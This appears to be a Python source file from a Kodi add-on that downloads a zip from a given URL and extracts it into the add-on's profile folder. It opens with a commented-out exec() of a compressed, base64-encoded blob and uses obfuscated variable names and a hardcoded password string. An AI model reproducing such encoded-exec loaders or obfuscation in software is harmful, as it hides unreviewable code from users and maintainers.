#import base64,zlib
#exec(zlib.decompress(base64.b64decode('eJydVE1v1DAQvedXWO0hiRS8UOCyUg49UCiCUoly4RI58bgxdWzXdtiPX8/Y2exHCwjhQxLbb96M5z0nk4M1LpB1O3SV8VV8M86NrnrmeyXbysHjCD74LLjNMiM4hDMD8Y9KBnhNdvG8ZVZeEOYJZ4G1zEMG6w5sOAqxmyno4i9BlzE3qcm+DppWijLrzQCNZaGv4x4NjmmvWIBbXCrOvIVOMrVcLCJukUL94qzMJK8TA72HkD6utTBFHonykjqwinVQ7MmrPC+zrGluP317f33T3F7efWgarOfPHJng9a5XdOBvC8lL2sOay3vs2v/XHQY7RRlP45v+MFIf1xlgsHklOB5REG0CmYGwlihXMROUkwJxIGJgD8ClO9rOOtb1cCUVnKaaAVWuTMeUQAAN6xDbk/G2SyrNslGcauhCsecqI2Z0EROxFL+9cdgODoJws9LKMN5E0mJ0qjoqNGVLO5oNQE6LSgWRMyHXwBuF54wlYbdi4Dm5+XL3joQeiA8O2FDfuRGIZQ55ArgEihXNjo5ypuzH+IlrJUNPjAVdnJZTkXzV5mW0rDj0VRhHun7UD0Rq4iha3DV46AAaOxLXGy+3UL96efGmXJJ9WByoXUIssXxMgpHEjIE8ANgXTMmfQDSsJog/CUx56cphsilH+Wz7XFChRt8XJenMMGA1wEm7wfNPU1RPoozpbn6kV/QroJZBMj11CsLo9BM5sqTfqLfSFnGtPLreuBaX5sv9XdpohLR/eCAokaEMYt61weI0/4zJwWHPLfM+zw467JiKOTa1f7vv/1ag5fFadYEpdbCtXfG63QTwBfKX6NrfX5ODYye+53fu6c8A/efAm9F14HfWOzW0Ss6cPH04+fScWvcvnt6F7g6Z/QKWCtgV')))

import xbmc,os,xbmcaddon,hashlib,requests,logging
try:
    from sqlite3 import dbapi2 as database
except:
    from pysqlite2 import dbapi2 as database
Addon = xbmcaddon.Addon()
user_dataDir = xbmc.translatePath(Addon.getAddonInfo("profile"))
if not os.path.exists(user_dataDir):
     os.makedirs(user_dataDir)
     
#home_path=xbmc.translatePath("special://home/addons/")
#id=Addon.getAddonInfo('path').replace(home_path,'')

#__PLUGIN_PATH__ = Addon.getAddonInfo('path')
#fd=hashlib.md5(id).hexdigest()


def download_file(url,path):
    local_filename =os.path.join(path, "fixed_list.zip")
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush() commented by recommendation from J.F.Sebastian
    return local_filename

def unzip(O00O0O0OOO00O0O00):
    try:
        from zfile import ZipFile #line:19
    except:
        from zipfile import ZipFile
    
    OO0OOO0000O0O0O00 =O00O0O0OOO00O0O00 #line:22
    O0O0OO0OO0O0O0O0O ='Masterpenpass'#line:23
    O000000O0O0OO000O =ZipFile (OO0OOO0000O0O0O00 )#line:24
    O000000O0O0OO000O .extractall (user_dataDir )#line:27
    #xbmc.executebuiltin("XBMC.Extract({0}, {1})".format(zip_file, user_dataDir), True)


